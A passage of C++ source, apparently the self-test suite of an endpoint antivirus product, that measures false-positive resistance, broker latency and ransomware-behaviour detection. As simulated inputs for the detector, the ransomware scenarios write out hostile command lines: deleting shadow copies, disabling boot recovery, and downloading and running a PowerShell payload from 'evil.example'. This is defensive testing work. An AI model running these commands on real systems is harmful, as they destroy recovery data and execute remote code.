          CopyWideField(request.userSid, L"S-1-5-18");

          const auto outcome = broker.InspectFile(request);
          if (outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_ALLOW &&
              outcome.finding.verdict.disposition == VerdictDisposition::Allow && !outcome.detection) {
            AddCheck(report, L"phase1_false_positive_cleanware_execution", L"Phase 1 cleanware execution allowance",
                     SelfTestStatus::Pass,
                     L"Realtime execute inspection allowed staged cleanware content with disposition allow.");
          } else {
            AddCheck(report, L"phase1_false_positive_cleanware_execution", L"Phase 1 cleanware execution allowance",
                     SelfTestStatus::Fail,
                     L"Realtime execute inspection returned action " +
                         std::wstring(outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_BLOCK ? L"block" : L"allow") +
                         L" with disposition " + VerdictDispositionToString(outcome.finding.verdict.disposition) +
                         L" for staged cleanware content (reason " + FirstReasonCode(outcome.finding) + L").",
                     L"Tune realtime correlation and scan thresholds so benign script execution is not blocked.");
          }
        }
      } catch (const std::exception& error) {
        AddCheck(report, L"phase1_false_positive_cleanware_execution", L"Phase 1 cleanware execution allowance",
                 SelfTestStatus::Fail,
                 L"Realtime cleanware validation failed: " + Utf8ToWide(error.what()),
                 L"Validate local runtime database/evidence paths and rerun self-test in the endpoint service context.");
      }
    }

    const auto brokerLoadMaliciousPath = phaseValidationRoot / L"phase1-broker-load-malicious.ps1";
    const auto brokerLoadBenignPath = phaseValidationRoot / L"phase1-broker-load-benign.txt";
    if (!WriteSelfTestSample(brokerLoadMaliciousPath, kExecutionBlockingSample) ||
        !WriteSelfTestSample(brokerLoadBenignPath, kCleanwareDiskSample)) {
      AddCheck(report, L"phase1_broker_load_failmode", L"Phase 1 broker load/fail-mode proof", SelfTestStatus::Fail,
               L"Self-test could not stage broker load-validation artifacts under " + phaseValidationRoot.wstring() + L".",
               L"Ensure runtime/temp roots are writable before running broker load/fail-mode validation.");
    } else {
      try {
        auto realtimeConfig = config;
        realtimeConfig.runtimeDatabasePath = phaseValidationRoot / L"phase1-broker-load-runtime.db";
        realtimeConfig.quarantineRootPath = phaseValidationRoot / L"phase1-broker-load-quarantine";
        realtimeConfig.evidenceRootPath = phaseValidationRoot / L"phase1-broker-load-evidence";
        realtimeConfig.scanExcludedPaths.clear();

        std::error_code runtimePathError;
        std::filesystem::create_directories(realtimeConfig.runtimeDatabasePath.parent_path(), runtimePathError);
        std::filesystem::create_directories(realtimeConfig.quarantineRootPath, runtimePathError);
        std::filesystem::create_directories(realtimeConfig.evidenceRootPath, runtimePathError);
        if (runtimePathError) {
          AddCheck(report, L"phase1_broker_load_failmode", L"Phase 1 broker load/fail-mode proof", SelfTestStatus::Fail,
                   L"Self-test could not prepare isolated broker load-validation paths under " +
                       phaseValidationRoot.wstring() + L".",
                   L"Ensure runtime, quarantine, and evidence roots are writable before running broker load/fail-mode checks.");
        } else {
          auto realtimePolicy = CreateDefaultPolicySnapshot();
          realtimePolicy.cloudLookupEnabled = false;
          realtimePolicy.quarantineOnMalicious = false;

          RealtimeProtectionBroker broker(realtimeConfig);
          broker.SetPolicy(realtimePolicy);
          broker.SetDeviceId(L"self-test-device");

          struct BurstMetrics {
            int blockCount{0};
            int allowCount{0};
            long long p95LatencyMs{0};
            long long maxLatencyMs{0};
          };

          const auto processImage = PathExists(servicePath) ? servicePath.wstring() : L"fenrir-agent-service.exe";
          const auto runBurst = [&broker, &processImage](const std::filesystem::path& path,
                                                         const RealtimeFileOperation operation,
                                                         const int iterations,
                                                         const std::wstring& correlationIdPrefix) {
            BurstMetrics metrics{};
            std::vector<long long> latencySamples;
            latencySamples.reserve(static_cast<std::size_t>(std::max(iterations, 0)));

            std::error_code absolutePathError;
            auto resolvedPath = std::filesystem::absolute(path, absolutePathError);
            if (absolutePathError) {
              resolvedPath = path;
            }

            for (int index = 0; index < iterations; ++index) {
              RealtimeFileScanRequest request{};
              request.protocolVersion = ANTIVIRUS_REALTIME_PROTOCOL_VERSION;
              request.requestSize = sizeof(request);
              request.requestId = static_cast<std::uint64_t>(std::chrono::duration_cast<std::chrono::milliseconds>(
                                                                   std::chrono::system_clock::now().time_since_epoch())
                                                                   .count() + index);
              request.operation = operation;
              request.processId = GetCurrentProcessId();
              request.threadId = GetCurrentThreadId();

              std::error_code fileSizeError;
              request.fileSizeBytes = std::filesystem::file_size(resolvedPath, fileSizeError);
              if (fileSizeError) {
                request.fileSizeBytes = 0;
              }

              CopyWideField(request.correlationId, correlationIdPrefix + L"-" + std::to_wstring(index));
              CopyWideField(request.path, resolvedPath.wstring());
              CopyWideField(request.processImage, processImage);
              CopyWideField(request.parentImage, processImage);
              CopyWideField(request.commandLine, L"fenrir-agent-service.exe --self-test --broker-load");
              CopyWideField(request.userSid, L"S-1-5-18");

              const auto startedAt = std::chrono::steady_clock::now();
              const auto outcome = broker.InspectFile(request);
              const auto completedAt = std::chrono::steady_clock::now();
              const auto latencyMs =
                  std::chrono::duration_cast<std::chrono::milliseconds>(completedAt - startedAt).count();
              latencySamples.push_back(latencyMs);

              const auto blocked = outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_BLOCK ||
                                   outcome.finding.verdict.disposition == VerdictDisposition::Block ||
                                   outcome.finding.verdict.disposition == VerdictDisposition::Quarantine;
              if (blocked) {
                ++metrics.blockCount;
              } else {
                ++metrics.allowCount;
              }
            }

            if (!latencySamples.empty()) {
              std::sort(latencySamples.begin(), latencySamples.end());
              const auto percentileIndex = (latencySamples.size() * 95) / 100;
              metrics.p95LatencyMs = latencySamples[std::min(percentileIndex, latencySamples.size() - 1)];
              metrics.maxLatencyMs = latencySamples.back();
            }

            return metrics;
          };

          const auto benignMetrics =
              runBurst(brokerLoadBenignPath, ANTIVIRUS_REALTIME_FILE_OPERATION_WRITE, 120, L"self-test-phase1-broker-benign");
          const auto renameMaliciousMetrics = runBurst(brokerLoadMaliciousPath, ANTIVIRUS_REALTIME_FILE_OPERATION_RENAME,
                                                       24, L"self-test-phase1-broker-rename");
          const auto sectionMaliciousMetrics = runBurst(
              brokerLoadMaliciousPath, ANTIVIRUS_REALTIME_FILE_OPERATION_SECTION_MAP, 24,
              L"self-test-phase1-broker-section");

          const auto benignAllowRatio = benignMetrics.allowCount / 120.0;
          const auto renameBlockRatio = renameMaliciousMetrics.blockCount / 24.0;
          const auto sectionBlockRatio = sectionMaliciousMetrics.blockCount / 24.0;

          if (benignAllowRatio >= 0.95 && renameBlockRatio >= 0.95 && sectionBlockRatio >= 0.95 &&
              benignMetrics.p95LatencyMs <= 250) {
            AddCheck(report, L"phase1_broker_load_failmode", L"Phase 1 broker load/fail-mode proof", SelfTestStatus::Pass,
                     L"Under burst load, benign write requests remained allow-biased while malicious rename/section requests "
                     L"stayed fail-closed (benign allow ratio " + std::to_wstring(benignAllowRatio) +
                         L", rename block ratio " + std::to_wstring(renameBlockRatio) +
                         L", section block ratio " + std::to_wstring(sectionBlockRatio) +
                         L", benign p95 latency " + std::to_wstring(benignMetrics.p95LatencyMs) + L" ms)." );
          } else {
            AddCheck(report, L"phase1_broker_load_failmode", L"Phase 1 broker load/fail-mode proof", SelfTestStatus::Fail,
                     L"Broker load/fail-mode validation did not meet thresholds (benign allow ratio " +
                         std::to_wstring(benignAllowRatio) + L", rename block ratio " +
                         std::to_wstring(renameBlockRatio) + L", section block ratio " +
                         std::to_wstring(sectionBlockRatio) + L", benign p95 latency " +
                         std::to_wstring(benignMetrics.p95LatencyMs) + L" ms, benign max latency " +
                         std::to_wstring(benignMetrics.maxLatencyMs) + L" ms).",
                     L"Review realtime broker latency budgets and fail-closed operation mapping for rename/section interception paths.");
          }
        }
      } catch (const std::exception& error) {
        AddCheck(report, L"phase1_broker_load_failmode", L"Phase 1 broker load/fail-mode proof", SelfTestStatus::Fail,
                 L"Broker load/fail-mode simulation failed: " + Utf8ToWide(error.what()),
                 L"Validate isolated runtime/evidence paths and rerun self-test in endpoint service context.");
      }
    }

    const auto browserDownloadInstallRoot = phaseValidationRoot / L"phase1-browser-download-install-set";
    const std::vector<std::filesystem::path> browserDownloadInstallSamples = {
        browserDownloadInstallRoot / L"downloads" / L"invoice.pdf",
        browserDownloadInstallRoot / L"downloads" / L"QuarterlySummary.xlsx",
        browserDownloadInstallRoot / L"installers" / L"AcmeUpdater.log",
        browserDownloadInstallRoot / L"installers" / L"release-notes.txt",
    };

    std::vector<std::wstring> writeFailures;
    for (const auto& samplePath : browserDownloadInstallSamples) {
      if (!WriteSelfTestSample(samplePath, kBrowserDownloadInstallSample)) {
        writeFailures.push_back(samplePath.wstring());
      }
    }

    if (!writeFailures.empty()) {
      std::wstring details = L"Self-test could not stage one or more benign browser/download/install samples:";
      for (const auto& failedPath : writeFailures) {
        details += L" ";
        details += failedPath;
      }

      AddCheck(report, L"phase1_browser_download_install_set", L"Phase 1 browser/download/install clean set",
               SelfTestStatus::Fail, details,
               L"Verify local runtime/temp ACLs and rerun self-test from the target endpoint context.");
    } else {
      auto cleanSetPolicy = CreateDefaultPolicySnapshot();
      cleanSetPolicy.cloudLookupEnabled = false;
      cleanSetPolicy.quarantineOnMalicious = false;

      const auto cleanSetFindings = ScanTargets({browserDownloadInstallRoot}, cleanSetPolicy);
      if (cleanSetFindings.empty()) {
        AddCheck(report, L"phase1_browser_download_install_set", L"Phase 1 browser/download/install clean set",
                 SelfTestStatus::Pass,
                 L"ScanTargets returned no malicious findings across staged benign browser/download/install artifacts.");
      } else {
        const auto& firstFinding = cleanSetFindings.front();
        AddCheck(report, L"phase1_browser_download_install_set", L"Phase 1 browser/download/install clean set",
                 SelfTestStatus::Fail,
                 L"ScanTargets flagged staged benign artifact " + firstFinding.path.wstring() + L" with disposition " +
                     VerdictDispositionToString(firstFinding.verdict.disposition) + L" (reason " +
                     FirstReasonCode(firstFinding) + L").",
                 L"Tune false-positive heuristics for common business download/install artifacts before pilot rollout.");
      }
    }

    const auto suppressionRoot = phaseValidationRoot / L"phase1-suppression-root";
    const auto suppressionSamplePath = suppressionRoot / L"phase1-suppressed-eicar.txt";
    if (!WriteSelfTestSample(suppressionSamplePath, kDiskBlockingSample)) {
      AddCheck(report, L"phase1_suppression_workflow", L"Phase 1 suppression workflow", SelfTestStatus::Fail,
               L"Self-test could not write the staged suppression sample at " + suppressionSamplePath.wstring() + L".",
               L"Verify local runtime/temp ACLs and rerun self-test from the target endpoint context.");
    } else {
      auto suppressionPolicy = CreateDefaultPolicySnapshot();
      suppressionPolicy.cloudLookupEnabled = false;
      suppressionPolicy.quarantineOnMalicious = false;
      suppressionPolicy.suppressionPathRoots.push_back(suppressionRoot.wstring());

      const auto allowOverride = BuildAllowOverrideFinding(suppressionSamplePath, suppressionPolicy);
      const auto scanFinding = ScanFile(suppressionSamplePath, suppressionPolicy);
      const auto overrideMatched = allowOverride.has_value() &&
                                   allowOverride->verdict.disposition == VerdictDisposition::Allow &&
                                   FindingHasReasonCode(*allowOverride, L"POLICY_SUPPRESSION_PATH_ROOT");
      if (overrideMatched && !scanFinding.has_value()) {
        AddCheck(report, L"phase1_suppression_workflow", L"Phase 1 suppression workflow", SelfTestStatus::Pass,
                 L"Suppression path-root policy produced an allow override and bypassed malicious-file scoring for staged sample.");
      } else {
        std::wstring details = L"Suppression path-root validation did not complete expected allow/bypass behavior.";
        if (allowOverride.has_value()) {
          details += L" Override disposition: ";
          details += VerdictDispositionToString(allowOverride->verdict.disposition);
          details += L" (reason ";
          details += FirstReasonCode(*allowOverride);
          details += L").";
        } else {
          details += L" No allow-override finding was produced.";
        }

        if (scanFinding.has_value()) {
          details += L" ScanFile still returned disposition ";
          details += VerdictDispositionToString(scanFinding->verdict.disposition);
          details += L" (reason ";
          details += FirstReasonCode(*scanFinding);
          details += L").";
        }

        AddCheck(report, L"phase1_suppression_workflow", L"Phase 1 suppression workflow", SelfTestStatus::Fail,
                 details,
                 L"Review suppression policy matching and allow-override handling so approved cleanware exceptions remain enforceable.");
      }
    }

    const auto signedCandidate = FindSignedSystemBinaryCandidate();
    if (!signedCandidate.has_value()) {
      AddCheck(report, L"phase1_signed_software_trust", L"Phase 1 signed software trust tests",
               SelfTestStatus::Warning,
               L"Self-test did not find an Authenticode-signed Windows binary with a readable signer subject.",
               L"Run this check on a standard Windows client image with default signed system binaries available.");
    } else {
      auto trustPolicy = CreateDefaultPolicySnapshot();
      trustPolicy.cloudLookupEnabled = false;
      trustPolicy.quarantineOnMalicious = false;

      const auto baselineFinding = ScanFile(signedCandidate->path, trustPolicy);
      const auto baselineSafe = !baselineFinding.has_value() ||
                                baselineFinding->verdict.disposition == VerdictDisposition::Allow;

      auto signerSuppressionPolicy = trustPolicy;
      signerSuppressionPolicy.suppressionSignerNames.push_back(signedCandidate->signer);

      const auto signerOverride = BuildAllowOverrideFinding(signedCandidate->path, signerSuppressionPolicy);
      const auto signerSuppressedScan = ScanFile(signedCandidate->path, signerSuppressionPolicy);
      const auto signerSuppressionMatched =
          signerOverride.has_value() &&
          signerOverride->verdict.disposition == VerdictDisposition::Allow &&
          FindingHasReasonCode(*signerOverride, L"POLICY_SUPPRESSION_SIGNER");

      if (baselineSafe && signerSuppressionMatched && !signerSuppressedScan.has_value()) {
        AddCheck(report, L"phase1_signed_software_trust", L"Phase 1 signed software trust tests",
                 SelfTestStatus::Pass,
                 L"Verified signed software trust behavior with " + signedCandidate->path.wstring() +
                     L" (signer: " + signedCandidate->signer + L").");
      } else {
        std::wstring details =
            L"Signed software trust validation failed for " + signedCandidate->path.wstring() + L".";
        if (baselineFinding.has_value()) {
          details += L" Baseline disposition: ";
          details += VerdictDispositionToString(baselineFinding->verdict.disposition);
          details += L" (reason ";
          details += FirstReasonCode(*baselineFinding);
          details += L").";
        }

        if (signerOverride.has_value()) {
          details += L" Signer override disposition: ";
          details += VerdictDispositionToString(signerOverride->verdict.disposition);
          details += L" (reason ";
          details += FirstReasonCode(*signerOverride);
          details += L").";
        } else {
          details += L" No signer suppression override was produced.";
        }

        if (signerSuppressedScan.has_value()) {
          details += L" ScanFile with signer suppression still returned ";
          details += VerdictDispositionToString(signerSuppressedScan->verdict.disposition);
          details += L" (reason ";
          details += FirstReasonCode(*signerSuppressedScan);
          details += L").";
        }

        AddCheck(report, L"phase1_signed_software_trust", L"Phase 1 signed software trust tests",
                 SelfTestStatus::Fail, details,
                 L"Tune signer reputation/suppression handling so trusted signed software does not regress into false positives.");
      }
    }

    try {
      auto phase2Config = config;
      phase2Config.runtimeDatabasePath = phaseValidationRoot / L"phase2-runtime.db";
      phase2Config.quarantineRootPath = phaseValidationRoot / L"phase2-quarantine";
      phase2Config.evidenceRootPath = phaseValidationRoot / L"phase2-evidence";
      phase2Config.scanExcludedPaths.clear();

      std::error_code phase2PathError;
      std::filesystem::create_directories(phase2Config.runtimeDatabasePath.parent_path(), phase2PathError);
      std::filesystem::create_directories(phase2Config.quarantineRootPath, phase2PathError);
      std::filesystem::create_directories(phase2Config.evidenceRootPath, phase2PathError);

      if (phase2PathError) {
        AddCheck(report, L"phase2_ransomware_behavior_chain", L"Phase 2 ransomware behavior chain",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 2 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 2 behavior checks.");
        AddCheck(report, L"phase2_ransomware_false_positive_bulk_io",
                 L"Phase 2 benign bulk-I/O false-positive resistance", SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 2 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 2 behavior checks.");
      } else {
        auto phase2Policy = CreateDefaultPolicySnapshot();
        phase2Policy.cloudLookupEnabled = false;
        phase2Policy.quarantineOnMalicious = false;

        RealtimeProtectionBroker broker(phase2Config);
        broker.SetPolicy(phase2Policy);
        broker.SetDeviceId(L"self-test-device");

        struct Phase2BurstScenarioResult {
          bool blocked{false};
          int blockedCount{0};
          std::vector<std::wstring> reasonCodes;
          std::wstring details;
        };

        const auto joinReasonCodes = [](const std::vector<std::wstring>& reasonCodes) {
          if (reasonCodes.empty()) {
            return std::wstring(L"none");
          }

          std::wstring joined;
          for (std::size_t index = 0; index < reasonCodes.size(); ++index) {
            if (index != 0) {
              joined += L", ";
            }
            joined += reasonCodes[index];
          }
          return joined;
        };

        const auto hasReasonCodePrefix = [](const Phase2BurstScenarioResult& result, const std::wstring& prefix) {
          return std::any_of(result.reasonCodes.begin(), result.reasonCodes.end(),
                             [&prefix](const auto& code) { return code.starts_with(prefix); });
        };

        const auto hasReasonCode = [](const Phase2BurstScenarioResult& result, const std::wstring& code) {
          return std::any_of(result.reasonCodes.begin(), result.reasonCodes.end(),
                             [&code](const auto& candidate) { return candidate == code; });
        };

        const auto observeBehaviorEvent = [&broker](const EventKind kind,
                                                    const std::wstring& correlationId,
                                                    const std::wstring& targetPath,
                                                    const std::wstring& processImage,
                                                    const std::wstring& parentImage,
                                                    const std::wstring& commandLine,
                                                    const std::wstring& userSid) {
          broker.ObserveBehaviorEvent(EventEnvelope{
              .kind = kind,
              .deviceId = L"self-test-device",
              .correlationId = correlationId,
              .targetPath = targetPath,
              .sha256 = {},
              .process =
                  ProcessContext{
                      .imagePath = processImage,
                      .commandLine = commandLine,
                      .parentImagePath = parentImage,
                      .userSid = userSid,
                      .signer = {}},
              .occurredAt = std::chrono::system_clock::now(),
          });
        };

        const auto runBurstScenario = [&broker, &joinReasonCodes](const std::filesystem::path& root,
                                                                  const std::wstring& correlationId,
                                                                  const std::wstring& processImage,
                                                                  const std::wstring& parentImage,
                                                                  const std::wstring& commandLine,
                                                                  const std::wstring& userSid,
                                                                  const char* payload,
                                                                  const std::vector<std::wstring>& extensions,
                                                                  const bool includeEncryptedExtensions,
                                                                  const std::size_t encryptedExtensionStartIndex = 24) {
          std::vector<std::filesystem::path> stagedPaths;
          const std::vector<std::wstring> directories = {L"documents", L"desktop", L"downloads", L"pictures", L"projects"};
          constexpr std::size_t kSampleCount = 40;

          for (std::size_t index = 0; index < kSampleCount; ++index) {
            const auto directoryName = directories[index % directories.size()];
            std::wstring extension = extensions[index % extensions.size()];
            if (includeEncryptedExtensions && index >= encryptedExtensionStartIndex) {
              extension = (index % 2 == 0) ? L".locked" : L".encrypted";
            }

            const auto stagedPath = root / directoryName / (L"phase2-file-" + std::to_wstring(index + 1) + extension);
            if (!WriteSelfTestSample(stagedPath, payload)) {
              return Phase2BurstScenarioResult{
                  .blocked = false,
                  .blockedCount = 0,
                  .reasonCodes = {},
                  .details = L"Failed to stage " + stagedPath.wstring() + L"."};
            }
            stagedPaths.push_back(stagedPath);
          }

          Phase2BurstScenarioResult result{};
          for (std::size_t index = 0; index < stagedPaths.size(); ++index) {
            const auto& stagedPath = stagedPaths[index];
            std::error_code absolutePathError;
            auto resolvedPath = std::filesystem::absolute(stagedPath, absolutePathError);
            if (absolutePathError) {
              resolvedPath = stagedPath;
            }

            RealtimeFileScanRequest request{};
            request.protocolVersion = ANTIVIRUS_REALTIME_PROTOCOL_VERSION;
            request.requestSize = sizeof(request);
            request.requestId = static_cast<std::uint64_t>(std::chrono::duration_cast<std::chrono::milliseconds>(
                                                                 std::chrono::system_clock::now().time_since_epoch())
                                                                 .count() + index);
            request.operation = ANTIVIRUS_REALTIME_FILE_OPERATION_WRITE;
            request.processId = GetCurrentProcessId();
            request.threadId = GetCurrentThreadId();

            std::error_code sizeError;
            request.fileSizeBytes = std::filesystem::file_size(resolvedPath, sizeError);
            if (sizeError) {
              request.fileSizeBytes = 0;
            }

            CopyWideField(request.correlationId, correlationId);
            CopyWideField(request.path, resolvedPath.wstring());
            CopyWideField(request.processImage, processImage);
            CopyWideField(request.parentImage, parentImage);
            CopyWideField(request.commandLine, commandLine);
            CopyWideField(request.userSid, userSid);

            const auto outcome = broker.InspectFile(request);
            if (outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_BLOCK ||
                outcome.finding.verdict.disposition == VerdictDisposition::Block ||
                outcome.finding.verdict.disposition == VerdictDisposition::Quarantine) {
              ++result.blockedCount;
              result.blocked = true;
              for (const auto& reason : outcome.finding.verdict.reasons) {
                result.reasonCodes.push_back(reason.code);
              }
              result.details = L"Blocked " + resolvedPath.wstring() + L" with reasons [" +
                               joinReasonCodes(result.reasonCodes) + L"].";
              break;
            }
          }

          if (result.details.empty()) {
            result.details = L"No block was observed across staged write-churn simulation files.";
          }

          return result;
        };

        const auto maliciousScenario = runBurstScenario(
            phaseValidationRoot / L"phase2-ransomware-burst",
            L"self-test-phase2-ransomware-burst",
            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            L"C:\\Windows\\explorer.exe",
            L"powershell.exe -NoProfile -Command \"vssadmin delete shadows /all /quiet; $aes = New-Object System.Security.Cryptography.AesManaged\"",
            L"S-1-5-21-1000",
            kPhase2RansomwareBurstSample,
            {L".docx", L".xlsx", L".pdf", L".jpg", L".txt", L".csv"},
            true);

        if (maliciousScenario.blocked && hasReasonCodePrefix(maliciousScenario, L"REALTIME_RANSOMWARE_")) {
          AddCheck(report, L"phase2_ransomware_behavior_chain", L"Phase 2 ransomware behavior chain",
                   SelfTestStatus::Pass,
                   L"Realtime write-churn simulation triggered ransomware behavior containment. " + maliciousScenario.details);
        } else {
          AddCheck(report, L"phase2_ransomware_behavior_chain", L"Phase 2 ransomware behavior chain",
                   SelfTestStatus::Fail,
                   L"Realtime write-churn simulation did not trigger expected ransomware behavior blocking. " +
                       maliciousScenario.details,
                   L"Tune Phase 2 behavior-chain scoring for destructive write bursts and pre-impact commands.");
        }

        const auto extensionBurstScenario = runBurstScenario(
            phaseValidationRoot / L"phase2-ransomware-extension-burst",
            L"self-test-phase2-extension-burst",
            L"C:\\Windows\\System32\\wscript.exe",
            L"C:\\Windows\\System32\\cmd.exe",
            L"wscript.exe //B //NoLogo rotate.js",
            L"S-1-5-21-1000",
            kPhase2RansomwareBurstSample,
            {L".docx", L".xlsx", L".pdf", L".jpg", L".txt", L".csv"},
            true,
            12);

        if (extensionBurstScenario.blocked &&
            hasReasonCode(extensionBurstScenario, L"REALTIME_RANSOMWARE_EXTENSION_BURST")) {
          AddCheck(report, L"phase2_ransomware_extension_burst", L"Phase 2 ransomware extension-burst detection",
                   SelfTestStatus::Pass,
                   L"Encrypted-extension burst simulation triggered ransomware extension-burst containment. " +
                       extensionBurstScenario.details);
        } else {
          AddCheck(report, L"phase2_ransomware_extension_burst", L"Phase 2 ransomware extension-burst detection",
                   SelfTestStatus::Fail,
                   L"Encrypted-extension burst simulation did not trigger the expected extension-burst reason path. " +
                       extensionBurstScenario.details,
                   L"Raise confidence on burst rename and encrypted-extension clustering without relying on extension lists alone.");
        }

        observeBehaviorEvent(
            EventKind::ProcessStart, L"self-test-phase2-staged-impact", L"C:\\Users\\Public\\Downloads\\invoice.docx.exe",
            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            L"powershell.exe -enc SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==; iwr https://evil.example/payload.ps1; iex $env:TEMP\\payload.ps1",
            L"S-1-5-21-1000");
        observeBehaviorEvent(
            EventKind::ScriptScan, L"self-test-phase2-staged-impact", L"C:\\Users\\Public\\AppData\\Local\\Temp\\payload.ps1",
            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            L"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\AppData\\Local\\Temp\\payload.ps1",
            L"S-1-5-21-1000");

        const auto stagedImpactScenario = runBurstScenario(
            phaseValidationRoot / L"phase2-ransomware-staged-impact",
            L"self-test-phase2-staged-impact",
            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            L"powershell.exe -NoProfile -Command \"bcdedit /set {default} recoveryenabled no; reagentc /disable; $aes = New-Object System.Security.Cryptography.AesManaged\"",
            L"S-1-5-21-1000",
            kPhase2RansomwareBurstSample,
            {L".docx", L".xlsx", L".pdf", L".jpg", L".txt", L".csv"},
            false);

        if (stagedImpactScenario.blocked &&
            hasReasonCode(stagedImpactScenario, L"REALTIME_CHAIN_RANSOMWARE_IMPACT")) {
          AddCheck(report, L"phase2_ransomware_staged_impact_chain", L"Phase 2 ransomware staged-impact chain",
                   SelfTestStatus::Pass,
                   L"Fenrir correlated scripted staging with recovery-inhibition impact behavior before mass encryption. " +
                       stagedImpactScenario.details);
        } else {
          AddCheck(report, L"phase2_ransomware_staged_impact_chain", L"Phase 2 ransomware staged-impact chain",
                   SelfTestStatus::Fail,
                   L"Fenrir did not correlate staged script activity with later impact behavior strongly enough. " +
                       stagedImpactScenario.details,
                   L"Strengthen process-lineage correlation so staging, scripting, and recovery inhibition combine into rapid containment.");
        }

        const auto benignScenario = runBurstScenario(
            phaseValidationRoot / L"phase2-benign-bulk-io",
            L"self-test-phase2-benign-bulk-io",
            L"C:\\Program Files\\BackupSuite\\backup-agent.exe",
            L"C:\\Windows\\System32\\services.exe",
            L"backup-agent.exe --sync --incremental --verify",
            L"S-1-5-21-2000",
            kPhase2BenignBulkIoSample,
            {L".docx", L".xlsx", L".pdf", L".jpg", L".txt", L".csv"},
            false);

        if (!benignScenario.blocked) {
          AddCheck(report, L"phase2_ransomware_false_positive_bulk_io",
                   L"Phase 2 benign bulk-I/O false-positive resistance", SelfTestStatus::Pass,
                   L"Benign backup-style bulk write simulation stayed allow-only across staged files.");
        } else {
          AddCheck(report, L"phase2_ransomware_false_positive_bulk_io",
                   L"Phase 2 benign bulk-I/O false-positive resistance", SelfTestStatus::Fail,
                   L"Benign backup-style bulk write simulation triggered blocking unexpectedly. " +
                       benignScenario.details,
                   L"Adjust benign bulk-I/O dampening so backup, sync, and migration workloads avoid ransomware false positives.");
        }

        const auto photoExportScenario = runBurstScenario(
            phaseValidationRoot / L"phase2-benign-photo-export",
            L"self-test-phase2-benign-photo-export",
            L"C:\\Program Files\\FFmpeg\\bin\\ffmpeg.exe",
            L"C:\\Windows\\explorer.exe",
            L"ffmpeg.exe -i C:\\Users\\Public\\Videos\\input.mov -vf scale=1920:1080 C:\\Users\\Public\\Pictures\\export-%03d.jpg",
            L"S-1-5-21-3000",
            kPhase2BenignBulkIoSample,
            {L".jpg", L".png", L".json", L".txt", L".csv", L".jpeg"},
            false);

        if (!photoExportScenario.blocked) {
          AddCheck(report, L"phase2_ransomware_false_positive_photo_export",
                   L"Phase 2 benign photo/video export false-positive resistance", SelfTestStatus::Pass,
                   L"Benign photo/video export write churn stayed allow-only across staged files.");
        } else {
          AddCheck(report, L"phase2_ransomware_false_positive_photo_export",
                   L"Phase 2 benign photo/video export false-positive resistance", SelfTestStatus::Fail,
                   L"Benign photo/video export simulation triggered blocking unexpectedly. " +
                       photoExportScenario.details,
                   L"Retain dampening for trusted media export tooling while preserving destructive-write detection.");
        }

        const auto developerBuildScenario = runBurstScenario(
            phaseValidationRoot / L"phase2-benign-developer-build",
            L"self-test-phase2-benign-developer-build",
            L"C:\\Program Files\\Microsoft Visual Studio\\2022\\BuildTools\\MSBuild\\Current\\Bin\\MSBuild.exe",
            L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Common7\\IDE\\devenv.exe",
            L"MSBuild.exe Fenrir.sln /t:Build /p:Configuration=Release /m",
            L"S-1-5-21-4000",
            kPhase2BenignBulkIoSample,
            {L".obj", L".pdb", L".lib", L".tlog", L".cache", L".ilk"},
            false);

        if (!developerBuildScenario.blocked) {
          AddCheck(report, L"phase2_ransomware_false_positive_developer_build",
                   L"Phase 2 developer build false-positive resistance", SelfTestStatus::Pass,
                   L"Benign developer build churn stayed allow-only across staged files.");
        } else {
          AddCheck(report, L"phase2_ransomware_false_positive_developer_build",
                   L"Phase 2 developer build false-positive resistance", SelfTestStatus::Fail,
                   L"Benign developer build simulation triggered blocking unexpectedly. " +
                       developerBuildScenario.details,
                   L"Prevent broad cross-directory churn heuristics from tripping on normal build output workflows.");
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase2_ransomware_behavior_chain", L"Phase 2 ransomware behavior chain",
               SelfTestStatus::Fail, L"Phase 2 ransomware behavior simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase2_ransomware_extension_burst", L"Phase 2 ransomware extension-burst detection",
               SelfTestStatus::Fail, L"Phase 2 ransomware extension-burst simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase2_ransomware_staged_impact_chain", L"Phase 2 ransomware staged-impact chain",
               SelfTestStatus::Fail, L"Phase 2 staged-impact correlation simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase2_ransomware_false_positive_bulk_io",
               L"Phase 2 benign bulk-I/O false-positive resistance", SelfTestStatus::Fail,
               L"Phase 2 benign bulk-I/O simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase2_ransomware_false_positive_photo_export",
               L"Phase 2 benign photo/video export false-positive resistance", SelfTestStatus::Fail,
               L"Phase 2 benign photo/video export simulation failed: " + Utf8ToWide(error.what()),
